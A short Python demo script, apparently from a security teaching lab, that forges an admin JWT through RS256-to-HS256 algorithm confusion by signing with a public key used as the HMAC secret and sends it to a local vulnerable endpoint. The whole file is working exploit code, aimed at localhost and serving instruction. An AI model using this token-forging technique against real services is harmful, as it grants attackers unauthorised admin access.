"""Educational RS256->HS256 confusion attack demo against local vulnerable app only."""

from __future__ import annotations

import requests  # Import requests for local vulnerable endpoint interaction.
from jose import jwt  # Import jose.jwt for forged token creation.

from src.jwt_utils import public_key_as_hmac_secret  # Import vulnerable HMAC-secret derivation helper.

VULN_BASE = "http://localhost:8001"  # Define vulnerable app base URL for local demo.


def run_attack() -> dict:
    """Forge HS256 token signed with public-key-derived HMAC secret."""

    forged = jwt.encode({"sub": "attacker", "role": "admin"}, public_key_as_hmac_secret(), algorithm="HS256")  # Forge token abusing algorithm confusion vulnerability.
    response = requests.get(f"{VULN_BASE}/vuln/confusion/protected", params={"token": forged}, timeout=8)  # Send forged token to vulnerable confusion endpoint.
    return {"status_code": response.status_code, "response": response.json()}  # Return structured attack result.


if __name__ == "__main__":
    print(run_attack())  # Execute and print confusion attack result.
